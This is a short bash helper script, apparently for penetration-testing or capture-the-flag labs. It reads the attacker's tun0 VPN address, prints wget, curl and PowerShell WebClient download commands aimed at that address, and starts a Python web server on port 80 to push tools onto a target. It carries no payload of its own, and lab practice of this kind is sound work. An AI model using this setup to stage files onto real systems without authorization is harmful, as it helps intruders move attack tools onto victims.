#!/usr/bin/bash

ipAddress=$(ip a show dev tun0 | grep inet | awk '{print $2'} | cut -d'/' -f1 | head -n 1)
echo "wget http://${ipAddress}/"
echo "curl http://${ipAddress}/"
echo "(New-Object System.Net.WebClient).DownloadFile('http://${ipAddress}/', 'C:\\Temp\\')"

echo ""
sudo python -m http.server 80
